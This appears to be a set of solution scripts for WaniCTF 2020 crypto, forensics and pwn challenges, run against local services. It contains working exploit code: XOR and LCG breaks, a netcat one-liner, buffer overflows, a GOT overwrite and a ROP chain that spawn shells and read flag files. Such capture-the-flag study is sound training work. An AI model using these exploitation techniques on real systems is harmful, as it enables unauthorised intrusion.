# crypto

## veni_vidi

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/veni_vidi

ROT13

## exclusive

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/exclusive

```python
#!/usr/bin/env python3
def encrypt(s: str, t: str) -> str:
    return "".join([chr(ord(ss) ^ ord(tt)) for ss, tt in zip(s, t)])


ct = open("output.txt").readline().strip()
key = encrypt("FLA", ct[:3]) * 19
flag = encrypt(ct, key)
print(f"{flag=}")
```

## basic_rsa

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/basic_rsa

```python
#!/usr/bin/env python3
from pwn import context, log, remote
io = remote("::1", 50000)


def read_num(var: str) -> int:
    io.recvuntil(f"{var} = ".encode())
    return int(io.recvline(drop=True))


def answer(ans: int) -> None:
    log.info(f"{ans = }")
    io.sendlineafter(b" > ", str(ans).encode())


# ----------------------------------------
p = read_num("p")
q = read_num("q")
n = p * q
answer(n)
# ----------------------------------------
m = read_num("m")
e = read_num("e")
n = read_num("n")
c = pow(m, e, n)
answer(c)
# ----------------------------------------
p = read_num("p")
q = read_num("q")
e = read_num("e")
c = read_num("c")
n = p * q
phy = (p - 1) * (q - 1)
d = pow(e, -1, phy)
m = pow(c, d, n)
answer(m)
# ----------------------------------------
io.recvuntil(b"FLAG{")
io.success("FLAG{%s", io.recvuntil(b"}").decode())
io.interactive()
```

## lcg

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/lcg

```zsh
#!/usr/bin/env python3
import math
from pwn import log, remote
io = remote("::1", 50001)


def read_num() -> int:
    io.recvuntil(b"> ")
    io.sendline(b"1")
    i = int(io.recvline(drop=True))
    log.info("read_num(): %d", i)
    return i


x0 = read_num()
x1 = read_num()
x2 = read_num()
x3 = read_num()
x4 = read_num()
y0 = x1 - x0
y1 = x2 - x1
y2 = x3 - x2
y3 = x4 - x3
m = math.gcd(abs(y3*y1 - y2*y2), abs(y2*y0 - y1*y1))
log.info(f"{m=}")
a = y1 * pow(y0, -1, m)
log.info(f"{a=}")
b = (x1 - a*x0) % m
log.info(f"{b=}")

io.recvuntil(b"> ")
io.sendline(b"2")

for _ in range(10):
    next_val = (a * x4 + b) % m
    log.info(f"{next_val=}")
    log.info("%s", io.recvuntil(b"> "))
    io.sendline(str(next_val).encode())
    x4 = next_val

io.timeout = 1
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}"))
io.stream()
```

## l0g0n

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/crypto/l0g0n

```zsh
yes 0000000000000000|nc ::1 50002|grep FLAG
```

# forensics

## logged_flag

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/forensics/logged_flag

```zsh
$ extract -sf secret.jpg
```

# pwn

## 01-netcat

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/01-netcat

```python
#!/usr/bin/env python3
from pwn import log, remote
io = remote("::1", 9001)
io.recvuntil(b"congratulation!\n")
io.sendline(b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
io.close()
```

## 02-var-rewrite

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/02-var-rewrite

```python
#!/usr/bin/env python3
from pwn import context, log, remote
context.log_level = "debug"
io = remote("::1", 9002)
io.sendlineafter(b"What's your name?: ", b"Y"*(0x16-0xc)+b"WANI")
io.sendlineafter(b"Congratulation!", b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
io.close()
```

## 03-binsh-address

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/03-binsh-address

```python
#!/usr/bin/env python3
from pwn import ELF, context, log, remote
exe = context.binary = ELF("./pwn03")
io = remote("::1", 9003)
io.recvuntil(b" is 0x")
head_addr = int(io.recvuntil(b".\n", drop=True), 16)
binsh_addr = head_addr + exe.sym.binsh - exe.sym.str_head
io.sendlineafter(b"hex number: ", hex(binsh_addr).encode())
io.sendlineafter(b"Congratulation!\n", b"cat flag.txt")
io.recvuntil(b"FLAG{")
log.success("FLAG{%s", io.recvuntil(b"}"))
io.close()
```

## 04-got-rewriter

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/04-got-rewriter

```python
#!/usr/bin/env python3
from pwn import ELF, args, context, log, process, remote
# context.log_level = "debug"
exe = context.binary = ELF("./pwn04", checksec=False)
if args.REMOTE:
    io = remote("::1", 9004)
else:
    io = process(exe.path)
io.recvuntil(b"win = 0x")
win_addr = int(io.recvline(drop=True), 16)
log.info("win():\t0x%016x", win_addr)
printf_got = exe.got.printf
log.info("printf@got:\t0x%016x", printf_got)
io.sendlineafter(b"0x6010b0): ", hex(printf_got).encode())
io.sendlineafter(b"rewrite value: ", hex(win_addr).encode())
io.interactive()
```

## 05-ret-rewrite

- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/05-ret-rewrite

```python
#!/usr/bin/env python3
from pwn import ELF, ROP, args, context, log, flat, remote, process
# context.log_level = "debug"
exe = context.binary = ELF("./pwn05", checksec=False)
if args.REMOTE:
    io = remote("::1", 9005)
else:
    io = process(exe.path)
rop = ROP(exe)
rop.raw(rop.ret)
rop.win()
log.info("rop:\n%s", rop.dump())
io.sendlineafter(b"What's your name?: ", flat(b"A"*14, b"B"*8, rop))
io.sendlineafter(b"congratulation!", b"cat flag.txt")
io.interactive()
```
